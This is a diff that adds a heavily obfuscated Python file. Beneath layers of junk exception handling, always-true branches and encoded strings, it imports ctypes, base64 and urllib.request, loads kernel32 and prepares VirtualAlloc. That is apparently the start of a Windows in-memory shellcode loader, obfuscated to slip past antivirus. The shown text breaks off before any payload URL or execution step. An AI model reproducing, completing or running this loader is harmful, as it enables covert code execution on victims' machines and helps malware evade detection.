@@ -1,0 +1,1007 @@
+__6164222092253 = 0
+__6164222092253 += 1
+try:
+    raise MemoryError(__6164222092253)
+except MemoryError as __7461811721802:
+    if __7461811721802.args[0] == 1:
+        globals()['R_E_D__A_V_______'] = bool if bool(bool(bool(bool))) < bool(type(int(119) > int(1614) < int(611) > int(1018))) and bool(str(str(1716) > int(511) < int(1011) > int(418))) > 2 else bool
+    if __7461811721802.args[0] == 3:
+        __6957669487368 = 29087700648442
+    if __7461811721802.args[0] == 4:
+        __2816586285436 = 19184556990086
+    if __7461811721802.args[0] == 5:
+        __4713123269377 = 125526272850575
+    if __7461811721802.args[0] == 6:
+        __3882266665945 = 229318272182029
+__2932307228593 = 0
+__2932307228593 += 1
+try:
+    raise MemoryError(__2932307228593)
+except MemoryError as __4757843905976:
+    if __4757843905976.args[0] == 1:
+        globals()['R_E_D__A_V______'] = str if bool(bool(bool(str))) < bool(type(int(310) > int(54) < int(135) > int(816))) and bool(str(str(76) > int(91) < int(23) > int(1410))) > 2 else str
+    if __4757843905976.args[0] == 3:
+        __7913892264881 = 206512423460912
+__7654756888450 = 0
+__7654756888450 += 1
+try:
+    raise MemoryError(__7654756888450)
+except MemoryError as __4180538429079:
+    if __4180538429079.args[0] == 1:
+        globals()['R_E_D__A_V________'] = type if bool(bool(bool(type))) < bool(type(int(1810) > int(1317) < int(316) > int(25))) and bool(str(str(196) > int(1013) < int(79) > int(124))) > 2 else type
+    if __4180538429079.args[0] == 3:
+        __2257912911129 = 21052930638028
+__5627814359156 = 0
+__5627814359156 += 1
+try:
+    raise MemoryError(__5627814359156)
+except MemoryError as __8189178697713:
+    if __8189178697713.args[0] == 1:
+        globals()['R_E_D__A_V_____'] = int if bool(bool(bool(int))) < bool(type(int(122) > int(198) < int(131) > int(214))) and bool(str(str(618) > int(1319) < int(1710) > int(187))) > 2 else int
+    if __8189178697713.args[0] == 3:
+        __3433605476786 = 268164763518276
+__7226191369120 = 0
+__7226191369120 += 1
+try:
+    raise MemoryError(__7226191369120)
+except MemoryError as __8284310319985:
+    if __8284310319985.args[0] == 1:
+        globals()['R_E_D__A_V_________'] = bytes if bool(bool(bool(bytes))) < bool(type(int(16) > int(177) < int(1014) > int(1415))) and bool(str(str(56) > int(162) < int(128) > int(1413))) > 2 else bytes
+    if __8284310319985.args[0] == 3:
+        __5595417854403 = 163219825508815
+    if __8284310319985.args[0] == 4:
+        __7562191305062 = 147426503333483
+__3130184814198 = 0
+__3130184814198 += 1
+try:
+    raise MemoryError(__3130184814198)
+except MemoryError as __4644888113614:
+    if __4644888113614.args[0] == 1:
+        globals()['R_E_D__A_V__________'] = vars if bool(bool(bool(vars))) < bool(type(int(63) > int(53) < int(13) > int(1811))) and bool(str(str(319) > int(198) < int(168) > int(161))) > 2 else vars
+    if __4644888113614.args[0] == 3:
+        __8330806629014 = 27909882234913
+    if __4644888113614.args[0] == 4:
+        __6338973743098 = 127218055890919
+    if __4644888113614.args[0] == 5:
+        __2938707685295 = 147321757899819
+    if __4644888113614.args[0] == 6:
+        __3504130368605 = 222222718672275
+    if __4644888113614.args[0] == 7:
+        __4696336238861 = 25354001725978
+__8625361975861 = 0
+__8625361975861 += 1
+try:
+    raise MemoryError(__8625361975861)
+except MemoryError as __8529050818402:
+    if __8529050818402.args[0] == 1:
+        globals()['R_E_D__A_V____________'] = callable if bool(bool(bool(callable))) < bool(type(int(95) > int(1619) < int(317) > int(1819))) and bool(str(str(810) > int(711) < int(612) > int(36))) > 2 else callable
+    if __8529050818402.args[0] == 3:
+        __6367759958510 = 160122623513482
+__4448765955446 = 0
+__4448765955446 += 1
+try:
+    raise MemoryError(__4448765955446)
+except MemoryError as __3262747684006:
+    if __3262747684006.args[0] == 1:
+        globals()['R_E_D__A_V____'] = eval if bool(bool(bool(eval))) < bool(type(int(519) > int(183) < int(83) > int(47))) and bool(str(str(1817) > int(138) < int(21) > int(78))) > 2 else eval
+    if __3262747684006.args[0] == 3:
+        __8398165745745 = 89045057493138
+    if __3262747684006.args[0] == 4:
+        __4144439627913 = 47620737433369
+    if __3262747684006.args[0] == 5:
+        __7088146967038 = 205856975706225
+    if __3262747684006.args[0] == 6:
+        __3614543172035 = 21276268338763
+    if __3262747684006.args[0] == 7:
+        __3271958749011 = 225637255344050
+__6020396936160 = 0
+__6020396936160 += 1
+try:
+    raise MemoryError(__6020396936160)
+except MemoryError as __3967031052660:
+    if __3967031052660.args[0] == 1:
+        globals()['______________R_E_D__A_V______________'] = list if bool(bool(bool(list))) < bool(type(int(175) > int(414) < int(310) > int(178))) and bool(str(str(1512) > int(1516) < int(1812) > int(1510))) > 2 else list
+    if __3967031052660.args[0] == 3:
+        __2367167534922 = 222190581505071
+    if __3967031052660.args[0] == 4:
+        __8469831892979 = 38841196518345
+    if __3967031052660.args[0] == 5:
+        __6687417269033 = 221112341496930
+    if __3967031052660.args[0] == 6:
+        __5501966631875 = 145925485989010
+    if __3967031052660.args[0] == 7:
+        __7398160692440 = 190385583001798
+__4487019264592 = 0
+__4487019264592 += 1
+try:
+    raise MemoryError(__4487019264592)
+except MemoryError as __7039654995245:
+    if __7039654995245.args[0] == 1:
+        globals()['R_E_D__A_V______________'] = map if bool(bool(bool(map))) < bool(type(int(1518) > int(29) < int(614) > int(610))) and bool(str(str(91) > int(411) < int(108) > int(42))) > 2 else map
+    if __7039654995245.args[0] == 3:
+        __5296510493398 = 143490103964367
+__6812829639366 = 0
+__6812829639366 += 1
+try:
+    raise MemoryError(__6812829639366)
+except MemoryError as __2920018265739:
+    if __2920018265739.args[0] == 1:
+        globals()['R_E_D__A_V___'] = __import__ if bool(bool(bool(__import__))) < bool(type(int(137) > int(173) < int(49) > int(815))) and bool(str(str(616) > int(189) < int(1810) > int(613))) > 2 else __import__
+    if __2920018265739.args[0] == 3:
+        __7687354615516 = 153396223083266
+    if __2920018265739.args[0] == 4:
+        __6907521150247 = 122589285701143
+    if __2920018265739.args[0] == 5:
+        __2454410611125 = 194452121691202
+__4043192509129 = 0
+__4043192509129 += 1
+try:
+    raise MemoryError(__4043192509129)
+except MemoryError as __6717248228104:
+    if __6717248228104.args[0] == 1:
+        globals()['tryᅠ'] = print if bool(bool(bool(print))) < bool(type(int(43) > int(135) < int(1819) > int(21))) and bool(str(str(618) > int(143) < int(122) > int(614))) > 2 else print
+    if __6717248228104.args[0] == 3:
+        __6078431539650 = 19924111751952
+    if __6717248228104.args[0] == 4:
+        __2257669744004 = 226422599020090
+__8179724656632 = 0
+__8179724656632 += 1
+try:
+    raise MemoryError(__8179724656632)
+except MemoryError as __5437085192373:
+    if __5437085192373.args[0] == 1:
+        globals()['exceptᅠ'] = input if bool(bool(bool(input))) < bool(type(int(93) > int(135) < int(1118) > int(1416))) and bool(str(str(89) > int(126) < int(614) > int(165))) > 2 else input
+    if __5437085192373.args[0] == 3:
+        __5550250152107 = 207733165974995
+    if __5437085192373.args[0] == 4:
+        __5845328557060 = 152479133895985
+
+def R_E_D__A_V____(RED_DEFENDER, *k):
+    __4330650300231 = 0
+    __4330650300231 += 1
+    try:
+        raise MemoryError(__4330650300231)
+    except MemoryError as __5937930129005:
+        if __5937930129005.args[0] == 1:
+            if k:
+                R_E_D____A_V = '+'
+                op = '+'
+            else:
+                R_E_D____A_V = ''
+                op = ''
+        if __5937930129005.args[0] == 1:
+            globals()['_198'] = (lambda: (lambda _416: _416 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()
+        if __5937930129005.args[0] == 1:
+            globals()['R_E_D__A_V____'] = R_E_D__A_V____
+        if __5937930129005.args[0] == 1:
+            globals()['R_E_D__A_V______'] = R_E_D__A_V______
+        if __5937930129005.args[0] == 1:
+            globals()['RED_DEFENDER'] = RED_DEFENDER
+        if __5937930129005.args[0] == 1:
+            for globals()['R_E_D____A_V_'] in globals()['RED_DEFENDER']:
+                if not _198:
+                    globals()['R_E_D____A_V_'] += (lambda: '')()
+                R_E_D____A_V += R_E_D__A_V______(R_E_D____A_V_)
+                f = (lambda: (lambda _135: _135 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()
+        if __5937930129005.args[0] == 1:
+            return R_E_D____A_V
+        if __5937930129005.args[0] == 9:
+            __2431025337689 = 241773709750499
+
+def ______R_E_D__A_V_______(x):
+    __6439677875232 = 0
+    __6439677875232 += 1
+    try:
+        raise MemoryError(__6439677875232)
+    except MemoryError as __8445833505321:
+        if __8445833505321.args[0] == 1:
+            return R_E_D__A_V_____(x - 30583)
+        if __8445833505321.args[0] == 3:
+            __2139671391010 = 236214804906825
+        if __8445833505321.args[0] == 4:
+            __2154852673986 = 92390394762954
+        if __8445833505321.args[0] == 5:
+            __4270341019759 = 105987319562155
+        if __8445833505321.args[0] == 6:
+            __6973489112136 = 262268179700768
+        if __8445833505321.args[0] == 7:
+            __7299492493561 = 103733932496640
+
+def R_E_D__A_V(e):
+    __6686985825155 = 0
+    __6686985825155 += 1
+    try:
+        raise MemoryError(__6686985825155)
+    except MemoryError as __2397544430641:
+        if __2397544430641.args[0] == 1:
+            br = bytearray(e[len(b'R_E_D__A_V__'):])
+        if __2397544430641.args[0] == 1:
+            r = 0
+        if __2397544430641.args[0] == 1:
+            for b in br:
+                r = r * 256 + b
+        if __2397544430641.args[0] == 1:
+            return r
+        if __2397544430641.args[0] == 6:
+            __3874746842821 = 91281399615816
+        if __2397544430641.args[0] == 7:
+            __6452944053702 = 241516042985600
+        if __2397544430641.args[0] == 8:
+            __4048243212119 = 276059401881867
+        if __2397544430641.args[0] == 9:
+            __3003469302165 = 140843977469142
+        if __2397544430641.args[0] == 10:
+            __6690180021358 = 112535914139478
+
+def ____________________________(x):
+    __2793121433851 = 0
+    __2793121433851 += 1
+    try:
+        raise MemoryError(__2793121433851)
+    except MemoryError as __4923839334230:
+        if __4923839334230.args[0] == 1:
+            ar = []
+        if __4923839334230.args[0] == 1:
+            for i in x:
+                ar.append(R_E_D__A_V____(i))
+        if __4923839334230.args[0] == 1:
+            return ar
+        if __4923839334230.args[0] == 5:
+            __2129960160754 = 65570551561609
+        if __4923839334230.args[0] == 6:
+            __5300214024074 = 142116661172181
+        if __4923839334230.args[0] == 7:
+            __6610906394285 = 10760550941208
+        if __4923839334230.args[0] == 8:
+            __3381131094333 = 235473542054564
+        if __4923839334230.args[0] == 9:
+            __3377773565939 = 117700969405197
+if (lambda: (lambda _716: _716 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)():
+
+    def R_E_D__A_V_______________(R_E_D__A_V____________):
+        R_E_D__A_V____________ = R_E_D__A_V____________ - 16742655
+        if R_E_D__A_V____________ <= 127:
+            return R_E_D__A_V______(R_E_D__A_V_________([R_E_D__A_V____________]), 'utf8')
+        elif R_E_D__A_V____________ <= 2047:
+            if 1 < 2:
+                b1 = 192 | R_E_D__A_V____________ >> 6
+            b2 = 128 | R_E_D__A_V____________ & 63
+            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2]), 'utf8')
+        elif R_E_D__A_V____________ <= 65535:
+            b1 = 224 | R_E_D__A_V____________ >> 12
+            if 2 > 1:
+                b2 = 128 | R_E_D__A_V____________ >> 6 & 63
+            b3 = 128 | R_E_D__A_V____________ & 63
+            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3]), 'utf8')
+        else:
+            b1 = 240 | R_E_D__A_V____________ >> 18
+            if 2 == 2:
+                b2 = 128 | R_E_D__A_V____________ >> 12 & 63
+            if 1 < 2 < 3:
+                b3 = 128 | R_E_D__A_V____________ >> 6 & 63
+            b4 = 128 | R_E_D__A_V____________ & 63
+            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3, b4]), 'utf8')
+
+    def _hex(j):
+        R_E_D__A_V____________ = ''
+        for _hex in j:
+            R_E_D__A_V____________ += R_E_D__A_V_______________(_hex)
+        return R_E_D__A_V____________
+else:
+    'R_E_D____A_V'
+try:
+    match '411' == '197':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _76 = [[True], [False]]
+            R_E_D__A_V______(['_1819'])
+    raise MemoryError([True])
+except MemoryError as _42:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742704, 16742703]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742704, 16742712]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _1512: _1512 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _145 = [[(lambda: (lambda _1214: _1214 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _151: _151 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742703, 16742705]))))())())()])
+        raise MemoryError([(lambda: (lambda _148: _148 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _1519:
+        import sys
+try:
+    match '311' == '614':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _175 = [[True], [False]]
+            R_E_D__A_V______(['_137'])
+    raise MemoryError([True])
+except MemoryError as _1316:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742704, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742704]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _1712: _1712 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _196 = [[(lambda: (lambda _95: _95 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _19: _19 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742708, 16742704]))))())())()])
+        raise MemoryError([(lambda: (lambda _1118: _1118 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _117:
+        import ctypes
+try:
+    match '165' == '1311':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _151 = [[True], [False]]
+            R_E_D__A_V______(['_414'])
+    raise MemoryError([True])
+except MemoryError as _1911:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742707]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _72: _72 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _1310 = [[(lambda: (lambda _1017: _1017 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _93: _93 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742706, 16742704, 16742711]))))())())()])
+        raise MemoryError([(lambda: (lambda _513: _513 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _1417:
+        import base64
+try:
+    match '417' == '111':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _106 = [[True], [False]]
+            R_E_D__A_V______(['_13'])
+    raise MemoryError([True])
+except MemoryError as _16:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742708]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742709]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _111: _111 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _1811 = [[(lambda: (lambda _810: _810 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _517: _517 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742712, 16742707]))))())())()])
+        raise MemoryError([(lambda: (lambda _1711: _1711 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _14:
+        import ctypes.wintypes as wt
+try:
+    match '187' == '153':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _1815 = [[True], [False]]
+            R_E_D__A_V______(['_158'])
+    raise MemoryError([True])
+except MemoryError as _815:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742706]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _14: _14 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _817 = [[(lambda: (lambda _417: _417 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1316: _1316 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742705, 16742705]))))())())()])
+        raise MemoryError([(lambda: (lambda _214: _214 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _28:
+        import urllib.request
+try:
+    match '917' == '1416':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _76 = [[True], [False]]
+            R_E_D__A_V______(['_610'])
+    raise MemoryError([True])
+except MemoryError as _83:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742704, 16742711]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _1813: _1813 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _413 = [[(lambda: (lambda _56: _56 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _147: _147 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711]))))())())()])
+        raise MemoryError([(lambda: (lambda _128: _128 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _118:
+        __4629442732478 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
+try:
+    match '56' == '187':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _316 = [[True], [False]]
+            R_E_D__A_V______(['_1114'])
+    raise MemoryError([True])
+except MemoryError as _1312:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742708]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742710]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _31: _31 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _75 = [[(lambda: (lambda _194: _194 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1816: _1816 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742711, 16742706]))))())())()])
+        raise MemoryError([(lambda: (lambda _1916: _1916 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _58:
+        __4629442732478 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
+try:
+    match '816' == '109':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _68 = [[True], [False]]
+            R_E_D__A_V______(['_74'])
+    raise MemoryError([True])
+except MemoryError as _134:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704, 16742709]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742710]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _512: _512 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _1618 = [[(lambda: (lambda _517: _517 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _146: _146 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742703, 16742704, 16742709]))))())())()])
+        raise MemoryError([(lambda: (lambda _115: _115 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _75:
+        try:
+            raise MemoryError(__4629442732478)
+        except MemoryError as __6286196367532:
+            if __6286196367532.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
+                kernel32 = ctypes.windll.kernel32
+            if __6286196367532.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
+                __7973117680864 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xcb\xb8\x84\x1a\xe9 '))()
+try:
+    match '134' == '1614':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _35 = [[True], [False]]
+            R_E_D__A_V______(['_1411'])
+    raise MemoryError([True])
+except MemoryError as _1112:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742704, 16742712]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _712: _712 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _92 = [[(lambda: (lambda _1914: _1914 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _16: _16 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742705, 16742710]))))())())()])
+        raise MemoryError([(lambda: (lambda _518: _518 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _154:
+        __7696823503600 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
+try:
+    match '314' == '617':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _116 = [[True], [False]]
+            R_E_D__A_V______(['_415'])
+    raise MemoryError([True])
+except MemoryError as _114:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742712]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _810: _810 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _76 = [[(lambda: (lambda _1716: _1716 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _196: _196 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711, 16742704, 16742708]))))())())()])
+        raise MemoryError([(lambda: (lambda _153: _153 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _1214:
+        __7696823503600 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
+try:
+    match '1218' == '171':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _128 = [[True], [False]]
+            R_E_D__A_V______(['_178'])
+    raise MemoryError([True])
+except MemoryError as _156:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704, 16742706]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742704, 16742711]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _1612: _1612 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _198 = [[(lambda: (lambda _187: _187 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _84: _84 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742705, 16742704, 16742703]))))())())()])
+        raise MemoryError([(lambda: (lambda _141: _141 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _1110:
+        try:
+            raise MemoryError(__7696823503600)
+        except MemoryError as __3204320128227:
+            if __3204320128227.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
+                kernel32.VirtualAlloc.argtypes = (wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD)
+            if __3204320128227.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
+                __3743572444367 = (lambda: R_E_D__A_V(b'R_E_D__A_V__>\x88#\xc94V'))()
+try:
+    match '1714' == '1611':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _179 = [[True], [False]]
+            R_E_D__A_V______(['_1517'])
+    raise MemoryError([True])
+except MemoryError as _1512:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742706]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742704, 16742703]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _512: _512 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _215 = [[(lambda: (lambda _31: _31 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _114: _114 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742712, 16742711]))))())())()])
+        raise MemoryError([(lambda: (lambda _910: _910 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _112:
+        __2403045619373 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
+try:
+    match '819' == '214':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _416 = [[True], [False]]
+            R_E_D__A_V______(['_43'])
+    raise MemoryError([True])
+except MemoryError as _1019:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742704]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _516: _516 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _1312 = [[(lambda: (lambda _610: _610 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _610: _610 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
